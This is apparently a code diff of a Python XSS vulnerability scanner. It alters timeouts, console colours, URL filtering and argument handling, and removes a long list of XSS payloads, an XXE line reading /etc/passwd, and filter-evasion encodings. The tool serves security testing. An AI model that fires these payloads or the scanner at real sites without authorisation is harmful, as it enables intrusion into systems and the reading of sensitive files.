@@ -525,7 +525,7 @@ def make_get_request(url, response_type="json"):
 
     for attempt in range(retries):
         try:
-            response = requests.get(url, headers=headers, timeout=2, verify=False)
+            response = requests.get(url, headers=headers, timeout=3, verify=False)
             if response.ok:
                 return response.json() if response_type.lower() == "json" else response.text
         except requests.RequestException as e:
@@ -543,7 +543,7 @@ def save_extracted_urls_to_file(url_list, output_file):
         with open(output_file, 'w') as file:
             for url in url_list:
                 file.write(url + "\n")
-        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Extracted URLs saved to {output_file}")
+        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}Extracted URLs saved to {output_file}")
     except OSError as e:
         print(f"Error saving extracted URLs: {e}")
 
@@ -641,7 +641,7 @@ class PassiveCrawl:
 
         for attempt in range(retries):
             try:
-                response = requests.get(url, headers=headers, timeout=2, verify=False)
+                response = requests.get(url, headers=headers, timeout=3, verify=False)
                 if response.ok:
                     return response.json() if response_type.lower() == "json" else response.text
             except requests.RequestException as e:
@@ -669,11 +669,12 @@ class PassiveCrawl:
                             final_url_list.add(url_data["url"])
                 elif source.lower() == "wayback":
                     print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from Wayback Machine...")
-                    url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
+                    url = f"http://web.archive.org/cdx/search/cdx?url={wild_card}{domain}&output=json&collapse=urlkey&fl=original"
                     urls_list = make_get_request(url, "json")
-                    if urls_list:
-                        for url in urls_list[1:]:  # Skip the header
-                            final_url_list.add(url[0])
+                    if urls_list and len(urls_list) > 1:  # Ensure there's data beyond the header
+                        for url in urls_list[1:]:  # Skip the header row
+                            if url:  # Add a safety check to ensure non-empty URLs
+                                final_url_list.add(url[0])
                 elif source.lower() == "commoncrawl":
                     print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from CommonCrawl...")
                     api_list = [
@@ -1030,7 +1031,7 @@ class XSSScanner:
             heuristic_results = []
             for dummy_payload_url in dummy_payloads:
                 try:
-                    response = requests.get(dummy_payload_url, verify=False, timeout=2)
+                    response = requests.get(dummy_payload_url, verify=False, timeout=3)
                     status_code = response.status_code
                     response_text = response.text.lower()
 
@@ -1068,7 +1069,7 @@ class XSSScanner:
             # Test top-scoring candidates
             for test_url, score in heuristic_results[:5]:  # Limit further tests to top 5
                 try:
-                    response = requests.get(test_url, verify=False, timeout=2)
+                    response = requests.get(test_url, verify=False, timeout=3)
                     if response.status_code == 200 and any(payload in response.text for payload in xss_payloads[:10]):
                         print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found with heuristic endpoint: {test_url}")
                         successful_payloads.append((test_url, "Heuristic Test"))
@@ -1085,7 +1086,7 @@ class XSSScanner:
             for payload in selected_filters:
                 payload_url = f"{url}?{param}={payload}"
                 try:
-                    response = requests.get(payload_url, verify=False, timeout=2)
+                    response = requests.get(payload_url, verify=False, timeout=3)
 
                     if self.stop_scan:
                         return successful_payloads
@@ -1304,11 +1305,11 @@ class XSSScanner:
             # Store vulnerabilities in the SQLite database
             self.store_vulnerabilities_in_sqlite()
 
-            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Vulnerabilities saved successfully. {Style.RESET_ALL}")
-            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} HTML report, database entries, and other output files have been created. {Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Vulnerabilities saved successfully. {Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} HTML report, database entries, and other output files have been created. {Style.RESET_ALL}")
         else:
-            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} No vulnerabilities found to save. {Style.RESET_ALL}")
-            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Exiting...{Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} No vulnerabilities found to save. {Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Exiting...{Style.RESET_ALL}")
 
 
 
@@ -1318,7 +1319,7 @@ class XSSScanner:
             with open(extracted_urls_filename, 'w') as file:
                 for url in self.url_list:
                     file.write(url + "\n")
-            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}Extracted URLs saved to {extracted_urls_filename}")
+            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Extracted URLs saved to {extracted_urls_filename}{Style.RESET_ALL}")
         except OSError as e:
             print(f"Error saving extracted URLs: {e}")
 
@@ -1326,9 +1327,9 @@ class XSSScanner:
         # Count and display the number of discovered links and parameters
         discovered_links = len(self.url_list)
         discovered_params = sum(len(parse_qs(urlparse(url).query)) for url in self.url_list)
-        print(f"[{current_time}] Discovered {discovered_links} links")
-        print(f"[{current_time}] Discovered {discovered_params} parameters")
-        print(f"[{current_time}] Now implementing logic to capture XSS vulnerabilities")
+        print(f"{Fore.YELLOW}[{current_time}] Discovered {discovered_links} links{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[{current_time}] Discovered {discovered_params} parameters{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[{current_time}] Now implementing logic to capture XSS vulnerabilities{Style.RESET_ALL}")
 
         # Remove duplicates and save extracted URLs
         self.url_list = list(set(self.url_list))
@@ -1386,7 +1387,7 @@ class XSSScanner:
             heuristic_results = []
             for dummy_payload_url in dummy_payloads:
                 try:
-                    response = requests.get(dummy_payload_url, verify=False, timeout=2)
+                    response = requests.get(dummy_payload_url, verify=False, timeout=3)
                     status_code = response.status_code
                     response_text = response.text.lower()
 
@@ -1424,7 +1425,7 @@ class XSSScanner:
             # Test top-scoring candidates
             for test_url, score in heuristic_results[:5]:  # Limit further tests to top 5
                 try:
-                    response = requests.get(test_url, verify=False, timeout=2)
+                    response = requests.get(test_url, verify=False, timeout=3)
                     if response.status_code == 200 and any(payload in response.text for payload in xss_payloads[:10]):
                         print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.GREEN}Potential XSS vulnerability found with heuristic endpoint: {test_url}")                        
                         successful_payloads.append((test_url, "Heuristic Test"))
@@ -1441,7 +1442,7 @@ class XSSScanner:
             for payload in selected_filters:
                 payload_url = f"{url}?{param}={payload}"
                 try:
-                    response = requests.get(payload_url, verify=False, timeout=2)
+                    response = requests.get(payload_url, verify=False, timeout=3)
 
                     if response.status_code == 200 and payload in response.text:
                         print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found: {payload_url}")
@@ -1536,8 +1537,6 @@ def save_extracted_urls(url_list):
 
 def process_urls(input_file, php_only=False, php_query=False, dedupe_php=False,
                  dedupe_php_with_id=False, with_id_question_mark=False, output_file=None):
-
-    # Function logic here
     """
     Reads a file with URLs, processes according to options, and returns usable URLs.
 
@@ -1547,77 +1546,92 @@ def process_urls(input_file, php_only=False, php_query=False, dedupe_php=False,
         php_query (bool): Extract only URLs with query parameters up to '='.
         dedupe_php (bool): Deduplicate URLs based on `.php` filenames only.
         dedupe_php_with_id (bool): Deduplicate `.php` filenames while retaining query parameters up to '='.
-        with_id_question_mark (bool): Auto-add a '?' to `.php` URLs missing it before query parameters.
+        with_id_question_mark (bool): Auto-add a '?' to URLs containing '=' if missing, supports all extensions and endpoints.
         output_file (str, optional): File to save the processed URLs.
 
     Returns:
         list: A list of processed URLs.
     """
-    usable_urls = set()
-    php_urls = {}
-    php_query_urls = {}
-
-    # Define a regex to validate proper scheme
+    # Supported extensions and common endpoints
+    supported_extensions = [".php", ".asp", ".htm", ".html", ".aspx", ".jsp", ".cgi"]
+    common_endpoints = [
+        "search?q=", "q?=", "id?=", "filter?q=", "query?=",
+        "name?=", "key?=", "page?=", "action?q=", "term?q=",
+        "login?", "signup?", "view?id=", "browse?q="
+    ]
     scheme_regex = re.compile(r"^https?://")
+    embedded_url_regex = re.compile(r'"url":\s*"([^"]+)"')
+
+    usable_urls = set()
+    processed_urls = set()  # To avoid duplicate results
+    php_query_urls = {}
 
     # Read URLs from the input file
     with open(input_file, 'r') as file:
         for line in file:
-            url = line.strip()
-            if scheme_regex.match(url):
-                parsed = urlparse(url)
+            line = line.strip()
+
+            # Extract embedded URLs if present
+            embedded_match = embedded_url_regex.search(line)
+            if embedded_match:
+                line = embedded_match.group(1)
+
+            # Validate the scheme and parse the URL
+            if scheme_regex.match(line):
+                parsed = urlparse(line)
                 clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
 
-                if php_query:
-                    # Extract URLs with `.php` and query parameters up to '='
-                    if clean_url.endswith(".php") and parsed.query:
-                        query_param = parsed.query.split("&")[0]  # Take the first query parameter
+                # Process URLs based on extensions
+                if any(clean_url.endswith(ext) for ext in supported_extensions):
+                    usable_urls.add(clean_url)
+
+                # Handle `php_only` option
+                if php_only and clean_url.endswith(".php"):
+                    processed_urls.add(clean_url)
+
+                # Handle `php_query` option
+                elif php_query and clean_url.endswith(".php") and parsed.query:
+                    query_param = parsed.query.split("&")[0]
+                    if "=" in query_param:
+                        param_part = f"{clean_url}?{query_param.split('=')[0]}="
+                        php_query_urls[clean_url] = param_part
+
+                # Handle `dedupe_php` option
+                elif dedupe_php and clean_url.endswith(".php"):
+                    base_url = clean_url.split(".php")[0] + ".php"
+                    processed_urls.add(base_url)
+
+                # Handle `dedupe_php_with_id` option
+                elif dedupe_php_with_id and clean_url.endswith(".php"):
+                    if parsed.query:
+                        query_param = parsed.query.split("&")[0]
                         if "=" in query_param:
                             param_part = f"{clean_url}?{query_param.split('=')[0]}="
                             php_query_urls[clean_url] = param_part
+                    else:
+                        processed_urls.add(clean_url.split(".php")[0] + ".php")
 
-                elif php_only:
-                    # Add only URLs ending with `.php`
-                    if clean_url.endswith(".php"):
-                        php_urls[clean_url] = clean_url
-
-                elif dedupe_php:
-                    # Deduplicate by `.php` filename only
-                    if clean_url.endswith(".php"):
-                        base_url = clean_url.split(".php")[0] + ".php"
-                        php_urls[clean_url] = base_url
-
-                elif dedupe_php_with_id:
-                    # Deduplicate by `.php` filename but retain query parameters up to '='
-                    if clean_url.endswith(".php"):
-                        if parsed.query:
-                            query_param = parsed.query.split("&")[0]
-                            if "=" in query_param:
-                                param_part = f"{clean_url}?{query_param.split('=')[0]}="
-                                php_query_urls[clean_url] = param_part
-                        else:
-                            php_query_urls[clean_url] = clean_url.split(".php")[0] + ".php"
-
+                # Handle `with_id_question_mark` option
                 elif with_id_question_mark:
-                    # Ensure URLs with `=` and query parameters have a `?`
-                    if clean_url.endswith("="):
-                        if parsed.query:
-                            query_param = parsed.query
-                            modified_url = f"{clean_url}?{query_param}"
-                            php_query_urls[clean_url] = modified_url
+                    # Add `?` if missing for URLs containing `=` or matching common endpoints
+                    if "=" in parsed.query or any(endpoint in line for endpoint in common_endpoints):
+                        if "?" not in line and "=" in line:
+                            modified_url = line.replace("=", "?=")
                         else:
-                            php_query_urls[clean_url] = clean_url
+                            modified_url = line
+                        processed_urls.add(modified_url)
 
-                else:
-                    usable_urls.add(url)
-
-    # Combine results
-    if php_query:
+    # Combine results based on the selected option
+    if php_only:
+        results = sorted(processed_urls)
+    elif php_query:
         results = sorted(php_query_urls.values())
-    elif php_only or dedupe_php:
-        results = sorted(set(php_urls.values()))
-    elif dedupe_php_with_id or with_id_question_mark:
+    elif dedupe_php:
+        results = sorted(processed_urls)
+    elif dedupe_php_with_id:
         results = sorted(php_query_urls.values())
+    elif with_id_question_mark:
+        results = sorted(processed_urls)
     else:
         results = sorted(usable_urls)
 
@@ -1628,7 +1642,6 @@ def process_urls(input_file, php_only=False, php_query=False, dedupe_php=False,
                 out_file.write(url + '\n')
 
     return results
-
 
 def get_arguments():
     # Create the argument parser with RawTextHelpFormatter to preserve formatting
@@ -1642,13 +1655,13 @@ def get_arguments():
     # URL Processing Options
     url_processing = parser.add_argument_group('\033[96mURL Processing Options\033[0m')
     url_processing.add_argument(
-        "-i", "--input",
+        "--input",
         dest="input",
         help="\033[93m                      Specify the input file containing URLs for processing.\033[0m",
         required=False
     )
     url_processing.add_argument(
-        "-o", "--output",
+        "--output",
         dest="output",
         help="\033[93m                      Specify the file path to save processed URLs or vulnerability scan results.\033[0m",
         required=False
@@ -1682,7 +1695,7 @@ def get_arguments():
     # XSS Inspector Options
     xss_inspector = parser.add_argument_group('\033[96mFine Tuning\033[0m')
     xss_inspector.add_argument(
-        "-t", "--thread",
+        "--thread",
         dest="thread",
         type=int,
         help="\033[93m                      Set the number of threads for URL testing (default: 50).\033[0m",
@@ -1709,7 +1722,7 @@ def get_arguments():
         default=10
     )
     xss_inspector.add_argument(
-        "-s", "--subs",
+        "--subs",
         dest="want_subdomain",
         action="store_true",
         help="\033[93m                      Include URLs from subdomains in the scan results.\033[0m"
@@ -1754,13 +1767,13 @@ def get_arguments():
     # Mandatory Arguments
     required_arguments = parser.add_argument_group('\033[91mScan Arguments\033[0m')
     required_arguments.add_argument(
-        "-l", "--list",
+        "--list",
         dest="url_list",
         help="\033[91m                      Provide a file containing a list of URLs (e.g., google_urls.txt).\033[0m",
         required=False
     )
     required_arguments.add_argument(
-        "-d", "--domain",
+        "--domain",
         dest="domain",
         help="\033[91m                      Specify the target domain for vulnerability assessment (e.g., testphp.vulnweb.com).\033[0m",
         required=False
@@ -1772,563 +1785,57 @@ def main():
     args = get_arguments()
 
     try:
-        # Ensure input file is provided
-        if not args.input:
-            raise ValueError("No input file provided. Use the --input option to specify a file.")
+        # Ensure at least one input method is provided
+        if not (args.input or args.use_extracted_file or args.domain or args.url_list):
+            raise ValueError("No input source provided. Use --input, --use-extracted-file, --domain, or --list to specify input.")
 
-        print(f"\033[96mProcessing URLs from:\033[0m {args.input}")
+        if args.input:
+            print(f"\033[96mProcessing URLs from:\033[0m {args.input}")
+            # Call process_urls with correct arguments
+            processed_urls = process_urls(
+                input_file=args.input,
+                php_only=args.php_only,
+                php_query=args.php_query,
+                dedupe_php=args.dedupe_php,
+                dedupe_php_with_id=args.dedupe_php_with_id,
+                with_id_question_mark=args.with_id_question_mark,
+                output_file=args.output
+            )
 
-        # Call process_urls with correct arguments
-        processed_urls = process_urls(
-            input_file=args.input,
-            php_only=args.php_only,
-            php_query=args.php_query,
-            dedupe_php=args.dedupe_php,
-            dedupe_php_with_id=args.dedupe_php_with_id,
-            with_id_question_mark=args.with_id_question_mark,
-            output_file=args.output
-        )
-
-        # Output results
-        if args.output:
-            print(f"\033[92mProcessed URLs saved to {args.output}\033[0m")
+            # Output results
+            if args.output:
+                print(f"\033[92mProcessed URLs saved to {args.output}\033[0m")
+            else:
+                print("\033[92mProcessed URLs:\033[0m")
+                for url in processed_urls:
+                    print(url)
+        elif args.use_extracted_file:
+            print(f"\033[96mUsing extracted file:\033[0m {args.use_extracted_file}")
+            # Process URLs from the extracted file
+            final_url_list = readTargetFromFile(args.use_extracted_file)
+            print(f"\033[92mLoaded {len(final_url_list)} URLs from {args.use_extracted_file}\033[0m")
+        elif args.domain:
+            print(f"\033[96mCollecting URLs for domain:\033[0m {args.domain}")
+            # Extract URLs from the domain
+            sources = args.sources.split(",") if args.sources.lower() != "all" else ["alienvault", "wayback", "commoncrawl"]
+            final_url_list = extract_from_sources(args.domain, args.want_subdomain, sources)
+        elif args.url_list:
+            print(f"\033[96mProcessing URL list from file:\033[0m {args.url_list}")
+            # Process URLs from the provided list
+            final_url_list = readTargetFromFile(args.url_list)
         else:
-            print("\033[92mProcessed URLs:\033[0m")
-            for url in processed_urls:
-                print(url)
+            print(f"[!] Invalid input source. Use --help for usage instructions.")
+            sys.exit(1)
 
     except ValueError as ve:
         print(f"\033[91mInput Error: {ve}\033[0m")
         sys.exit(1)
-    except FileNotFoundError:
-        print(f"\033[91mFile not found: {args.input}\033[0m")
+    except FileNotFoundError as fnf_error:
+        print(f"\033[91mFile not found: {fnf_error}\033[0m")
         sys.exit(1)
     except Exception as e:
         print(f"\033[91mError during processing: {str(e)}\033[0m")
         sys.exit(1)
-import base64
-import threading
-import pandas as pd
-import os
-from datetime import datetime
-from colorama import Fore, Style
-import sys
-import argparse
-import requests
-import argparse
-import re
-import argparse
-import re
-from urllib.parse import urlparse, parse_qs, urlunparse
-import numpy as np
-import sqlite3
-import random
-import signal
-from datetime import datetime
-import time
-import base64
-import threading
-from functools import partial
-from concurrent.futures import ThreadPoolExecutor
-from jinja2 import Environment, FileSystemLoader
-from urllib.parse import urlparse, parse_qs
-import html
-from colorama import Fore, Style
-import warnings
-
-# Suppress the specific SyntaxWarning
-warnings.filterwarnings("ignore", category=SyntaxWarning)
-
-cursor = "|"
-
-def animate_cursor():
-    global cursor
-    while True:
-        cursor = "|"
-        time.sleep(0.5)
-        cursor = " "
-        time.sleep(0.5)
-
-cursor_thread = threading.Thread(target=animate_cursor)
-cursor_thread.daemon = True
-cursor_thread.start()
-print(f"Loading{cursor}", end='\r')
-
-current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-requests.packages.urllib3.disable_warnings()
-
-BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
-
-# Capture start time
-start_time = time.time()
-
-# Define folder paths for outputs
-OUTPUT_FOLDER = "reports"
-HTML_FOLDER = os.path.join(OUTPUT_FOLDER)
-TEXT_FOLDER = os.path.join(OUTPUT_FOLDER)
-
-# Ensure the folders exist
-os.makedirs(HTML_FOLDER, exist_ok=True)
-os.makedirs(TEXT_FOLDER, exist_ok=True)
-
-from colorama import Fore, Style
-
-def score_endpoint(url, response, payloads):
-    score = 0
-
-    if response.status_code == 200:
-        score += 3
-        print(f"{Fore.GREEN}[200 OK]{Style.RESET_ALL} Status code indicates success. Score: +3")
-    elif response.status_code in [403, 302]:
-        score += 2
-        print(f"{Fore.YELLOW}[Redirect or Forbidden]{Style.RESET_ALL} Status code {response.status_code} detected. Score: +2")
-
-    if any(payload in response.text for payload in payloads):
-        score += 5
-        print(f"{Fore.MAGENTA}[Payload Match]{Style.RESET_ALL} XSS payload detected in response. Score: +5")
-
-    if '?' in url and '=' in url:
-        score += 2
-        print(f"{Fore.CYAN}[Query Parameters Found]{Style.RESET_ALL} URL contains query parameters. Score: +2")
-
-    if 'error' in response.text or 'not found' in response.text:
-        score -= 3
-        print(f"{Fore.RED}[Error/Not Found]{Style.RESET_ALL} 'Error' or 'Not Found' detected in response. Score: -3")
-
-    return score
-
-
-def display_output(urls):
-    """
-    Nicely formatted CLI output for URLs.
-
-    Args:
-        urls (list): List of processed URLs.
-    """
-    print("\nProcessed URLs:\n" + "=" * 40)
-    if urls:
-        for i, url in enumerate(urls, 1):
-            print(f"[{i}] {url}")
-    else:
-        print("No usable URLs found.")
-    print("=" * 40)
-
-def print_colored_result(url, score, elapsed_time=None):
-    if score >= 5:
-        print(f"{Fore.GREEN}[Likely Valid]{Style.RESET_ALL} {url} "
-              f"(Score: {score}, Time: {elapsed_time:.2f}s)" if elapsed_time else f"{Fore.GREEN}[Likely Valid]{Style.RESET_ALL} {url}")
-    elif score >= 2:
-        print(f"{Fore.YELLOW}[Medium Likelihood]{Style.RESET_ALL} {url} "
-              f"(Score: {score}, Time: {elapsed_time:.2f}s)" if elapsed_time else f"{Fore.YELLOW}[Medium Likelihood]{Style.RESET_ALL} {url}")
-    else:
-        print(f"{Fore.RED}[Unlikely Valid]{Style.RESET_ALL} {url} "
-              f"(Score: {score}, Time: {elapsed_time:.2f}s)" if elapsed_time else f"{Fore.RED}[Unlikely Valid]{Style.RESET_ALL} {url}")
-  
-
-xss_payloads = [
-    '<script>alert("XSS")</script>',
-    '<img src="x" onerror="alert(\'XSS\')" />',
-    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
-    '"><script>alert("XSS")</script>',
-    '"><img src=x onerror=alert("XSS")>',
-    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
-    'javascript:alert("XSS")',
-    'javascript:confirm("XSS")',
-    'javascript:eval("alert(\'XSS\')")',
-    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
-    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
-    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
-    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
-    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
-    '<img src=x onerror=confirm("XSS")>',
-    '<img src=x onerror=eval("alert(\'XSS\')")>',
-    '"><img src="x" onerror="alert(\'XSS\')" />',
-    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
-    '"><img src=x onerror=alert("XSS")>',
-    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
-    'javascript:alert("XSS")',
-    'javascript:confirm("XSS")',
-    'javascript:eval("alert(\'XSS\')")',
-    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
-    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
-    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
-    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
-    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
-    '<img src=x onerror=confirm("XSS")>',
-    '<img src=x onerror=eval("alert(\'XSS\')")>',
-    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
-    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
-    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
-    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
-    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
-    '<img src=x onerror=confirm("XSS")>',
-    '<img src=x onerror=eval("alert(\'XSS\')")>',
-    '<script>alert("XSS")</script>',
-    '<img src="x" onerror="alert(\'XSS\')" />',
-    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
-    '"><script>alert("XSS")</script>',
-    '"><img src=x onerror=alert("XSS")>',
-    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
-    'javascript:alert("XSS")',
-    'javascript:confirm("XSS")',
-    'javascript:eval("alert(\'XSS\')")',
-    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
-    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
-    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
-    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
-    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
-    '<img src=x onerror=confirm("XSS")>',
-    '<img src=x onerror=eval("alert(\'XSS\')")>',
-    '<img src=x onerror=alert("XSS")>',
-    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
-    # XSS Locator (Polygot)
-    '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
-    # Malformed A Tags
-    '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
-    '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
-    # Malformed IMG Tags
-    '<img foo=a src="javascript:alert(\'XSS\')">',
-    '<img foo=a onerror="alert(\'XSS\')">',
-    # fromCharCode
-    '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
-    # Default SRC Tag to Get Past Filters that Check SRC Domain
-    '<img src="http://example.com/image.jpg">',
-    # Default SRC Tag by Leaving it Empty
-    '<img src="">',
-    # Default SRC Tag by Leaving it out Entirely
-    '<img>',
-    # On Error Alert
-    '<img src=x onerror=alert("XSS")>',
-    # IMG onerror and JavaScript Alert Encode
-    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
-    # Decimal HTML Character References
-    '&#34;><img src=x onerror=alert(\'XSS\')>',
-    # Decimal HTML Character References Without Trailing Semicolons
-    '&#34><img src=x onerror=alert(\'XSS\')>',
-    # Hexadecimal HTML Character References Without Trailing Semicolons
-    '&#x22><img src=x onerror=alert(\'XSS\')>',
-    # List-style-image
-    '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
-    # VBscript in an Image
-    '<img src="vbscript:alert(\'XSS\')">',
-    # SVG Object Tag
-    '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
-    # ECMAScript 6
-    '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
-    # BODY Tag
-    '<BODY ONLOAD=alert(\'XSS\')>',
-    # <BODY ONLOAD=alert('XSS')>
-    '<BODY ONLOAD=alert(\'XSS\')>',
-    # Event Handlers
-    '<img onmouseover="alert(\'XSS\')" src="x">',
-    # Various Tags with Broken-up for XSS
-    '<s<Sc<script>ript>alert(\'XSS\')</script>',
-    # TABLE
-    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
-    # TD
-    '<TD BACKGROUND="javascript:alert(\'XSS\')">',
-    # DIV
-    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
-    # BASE TAG
-    '<BASE HREF="javascript:alert(\'XSS\');//">',
-    # OBJECT TAG
-    '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
-    # SSI XSS
-    '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
-    # HTML+TIME IN XML
-    '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
-    # Using ActionScript Inside Flash
-    '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
-    # MIME
-    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-]
-
-obfuscation_methods = [
-
-        lambda payload: payload,  # No obfuscation
-
-        # 1. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
-        lambda payload: "".join(f"\\x{ord(char):02x}" for char in payload) if payload else payload,
-
-        # 2. Obfuscate with Unicode escape sequences (e.g., \uHHHH)
-        lambda payload: "".join(f"\\u{ord(char):04x}" for char in payload) if payload else payload,
-
-        # 3. Base64 encode the payload
-        lambda payload: base64.b64encode(payload.encode()).decode(errors='ignore') if payload is not None else None,
-
-        # 4. Encode the payload in UTF-16
-        lambda payload: payload.encode('utf-16').decode(errors='ignore') if payload is not None else None,
-
-        # 5. Encode the payload with ROT13
-        lambda payload: payload.encode('rot_13').decode(errors='ignore') if payload is not None else None,
-
-        # 6. Obfuscate with percent-encoded characters (e.g., %HH)
-        lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,
-
-        # 7. Obfuscate with HTML entity references (e.g., &#xHH;)
-        lambda payload: "".join(f"&#x{ord(char):X};" for char in payload) if payload else payload,
-
-        # 8. Replace 'a' with null character '\x00a' and 'l' with '\x00c' (if a string)
-        lambda payload: payload.replace('a', '\x00a').replace('l', '\x00c') if payload is not None and isinstance(payload, str) else payload,
-
-        # 9. Encode the payload in UTF-16LE
-        lambda payload: payload.encode('utf-16le').decode(errors='ignore') if payload is not None else None,
-
-        # 10. Encode the payload in UTF-32LE
-        lambda payload: payload.encode('utf-32le').decode(errors='ignore') if payload is not None else None,
-
-        # 11. Reverse the payload
-        lambda payload: payload[::-1] if payload is not None else payload,
-
-        # 12. Convert payload to uppercase
-        lambda payload: payload.upper() if payload is not None else payload,
-
-        # 13. Convert payload to lowercase
-        lambda payload: payload.lower() if payload is not None else payload,
-
-        # 14. Swap case of the payload characters
-        lambda payload: payload.swapcase() if payload is not None else payload,
-
-        # 15. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
-        lambda payload: "".join(f"%{ord(char):02x}" for char in payload) if payload else payload,
-
-        # 16. Obfuscate with Unicode escape sequences (e.g., \uHHHH)
-        lambda payload: "".join(f"\\u{ord(char):04x}" for char in payload) if payload else payload,
-
-        # 17. Encode the payload in UTF-32BE
-        lambda payload: payload.encode('utf-32be').decode(errors='ignore') if payload is not None else None,
-
-        # 18. Obfuscate with Unicode escape sequences (e.g., \uHHHH)
-        lambda payload: "".join(f"%U{ord(char):08X}" for char in payload) if payload else payload,
-
